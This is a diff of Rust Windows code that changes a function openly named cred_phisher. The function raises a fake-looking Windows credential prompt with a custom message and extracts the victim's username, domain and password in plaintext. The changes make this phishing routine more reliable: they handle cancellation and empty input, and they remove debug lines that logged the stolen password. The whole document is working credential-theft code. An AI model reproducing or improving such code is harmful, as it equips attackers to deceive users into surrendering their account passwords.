@@ -6,17 +6,17 @@ use winapi::um::wincred::{CredUIPromptForWindowsCredentialsW,CredUnPackAuthentic
 #[allow(unused_imports)]
 use winapi::um::combaseapi::{CoTaskMemFree};
 use winapi::shared::windef::{HWND,HBITMAP};
-use winapi::shared::minwindef::{DWORD,ULONG,LPVOID,BOOL,FALSE,TRUE};
+use winapi::shared::minwindef::{DWORD,ULONG,LPVOID,BOOL,FALSE};
 use winapi::um::errhandlingapi::{GetLastError,SetLastError};
 use winapi::um::winnt::LPWSTR;
-use winapi::shared::winerror::{ERROR_INSUFFICIENT_BUFFER};
+use winapi::shared::winerror::{ERROR_INSUFFICIENT_BUFFER,ERROR_CANCELLED};
 
 use super::wchar_windows::{str_to_c_wstr,wstr_to_str};
 
 use std::error::Error;
 
 #[allow(unused_imports)]
-use super::{debug_trace};
+use super::{debug_trace,debug_buffer_trace,format_buffer_log,format_str_log};
 #[allow(unused_imports)]
 use super::loglib::{log_get_timestamp,log_output_function,init_log};
 
@@ -78,23 +78,33 @@ impl WStrBuf {
 		return;
 	}
 	fn set_len(&mut self, llen :DWORD) {
-		let slen :usize = (llen - 1) as usize;
-		unsafe {
-			self.bufv.set_len(slen);	
+		if llen > 0 {
+			let slen :usize = (llen - 1) as usize;
+			unsafe {
+				self.bufv.set_len(slen);	
+			}
+			
+			self.buflen = slen as DWORD;			
+		} else {
+			unsafe {
+				self.bufv.set_len(0);
+			}
+			self.buflen = 0;
 		}
-		
-		self.buflen = slen as DWORD;
 		return;
 	}
 
 	fn to_string(&self) -> Result<String,Box<dyn Error>> {
-		let ostr = wstr_to_str(&self.bufv);
-		if ostr.is_none() {
-			extargs_new_error!{CredLibError,"can not parse {:?}", self.bufv}
+		let mut ss :String = "".to_string();
+		if self.bufv.len() > 0 {
+			let ostr = wstr_to_str(&self.bufv);
+			if ostr.is_none() {
+				extargs_new_error!{CredLibError,"can not parse {:?}", self.bufv}
+			}
+			let sv :Box<[u8]> = ostr.unwrap();
+			let s1 = unsafe{ std::str::from_utf8(&(*Box::into_raw(sv)))?};
+			ss = s1.to_string();
 		}
-		let sv :Box<[u8]> = ostr.unwrap();
-		let s1 = unsafe{ std::str::from_utf8(&(*Box::into_raw(sv)))?};
-		let ss = s1.to_string();
 		return Ok(ss);
 	}
 
@@ -152,12 +162,20 @@ pub fn cred_phisher( msg :&str) -> Result<NetworkCredentials,Box<dyn Error>> {
 	passbuf.realloc(1);
 
 	unsafe {
+		SetLastError(0);
 		dret = CredUIPromptForWindowsCredentialsW(&mut credui,0,&mut authpackage,
 				std::ptr::null(),0,&mut outcomem.outbuf,&mut outcomem.outsize,&mut save,1);
 		if dret != 0 {
-			extargs_new_error!{CredLibError,"can not CredUIPromptForWindowsCredentialsW error [{}]", dret}
+			errcode = GetLastError();
+			if dret == ERROR_CANCELLED && errcode == 0 {
+				return Ok(NetworkCredentials{
+					Username : "".to_string(),
+					Domain : "".to_string(),
+					Password : "".to_string(),
+				});
+			}
+			extargs_new_error!{CredLibError,"can not CredUIPromptForWindowsCredentialsW error [{}] [{}]", dret,errcode}
 		}
-		debug_trace!("outsize [{}]", outcomem.outsize);
 
 		while 1 == 1 {
 			usersize = userbuf.bufsize;
@@ -178,22 +196,18 @@ pub fn cred_phisher( msg :&str) -> Result<NetworkCredentials,Box<dyn Error>> {
 				domainbuf.realloc(domainbuf.bufsize << 1);
 				passbuf.realloc(passbuf.bufsize << 1);
 			} else {
-				debug_trace!("bufv {:?} [{}] ",userbuf.bufv,userbuf.bufsize);
 				userbuf.set_len(usersize);
 				domainbuf.set_len(domainsize);
 				passbuf.set_len(passsize);
-				debug_trace!("userlen {} domainlen {} passlen {}",usersize,domainsize,passsize);
 				break;
 			}
 		}
 	}
 
 
-	debug_trace!("bufv {:?}",userbuf.bufv);
 	let names = userbuf.to_string()?;
 	let domains = domainbuf.to_string()?;
 	let passs = passbuf.to_string()?;
-	debug_trace!("passs {} names {} domains {}", passs, names, domains);
 
 
 	let retv = NetworkCredentials{
